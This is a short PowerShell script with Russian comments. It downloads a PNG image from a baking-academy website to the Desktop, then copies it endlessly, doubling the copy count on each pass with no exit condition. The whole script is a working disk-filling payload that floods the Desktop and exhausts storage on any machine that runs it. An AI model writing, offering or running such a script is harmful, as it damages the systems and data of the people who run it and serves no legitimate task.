$desktop = [Environment]::GetFolderPath('Desktop')
$filename = '3bfbfc477bfe5eed2e33a942b5d5e068.png'
$filepath = Join-Path $desktop $filename

# Скачиваем файл
Invoke-WebRequest -Uri 'https://baking-academy.ru/upload/resize_cache/iblock/3bf/720_1060_1/3bfbfc477bfe5eed2e33a942b5d5e068.png' -OutFile $filepath

# Инициализация
$i = 1

while ($true) {
    for ($j = 1; $j -le $i; $j++) {
        $newName = "${i}_${j}_$filename"
        $newPath = Join-Path $desktop $newName
        Copy-Item -Path $filepath -Destination $newPath -ErrorAction Stop
    }
    $i *= 2
}
